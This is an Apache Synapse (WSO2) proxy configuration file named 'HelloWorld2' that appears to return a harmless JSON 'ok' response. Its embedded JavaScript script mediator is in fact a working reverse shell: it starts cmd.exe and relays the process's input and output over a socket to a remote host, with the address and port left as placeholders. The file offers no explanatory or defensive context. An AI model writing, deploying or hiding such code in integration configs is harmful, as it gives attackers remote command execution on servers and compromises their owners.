<?xml version="1.0" encoding="UTF-8"?>
<proxy name="HelloWorld2" startOnLoad="true" transports="http https" xmlns="http://ws.apache.org/ns/synapse">
    <target>
        <inSequence>
            <payloadFactory media-type="json">
                <format>{"task":"ok"}</format>
                <args/>
            </payloadFactory>
            <script language="js"><![CDATA[var host="IP";
var port=PORT;
var cmd="cmd.exe";
var p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();]]></script>
            <respond/>
        </inSequence>
        <outSequence/>
        <faultSequence/>
    </target>
</proxy>
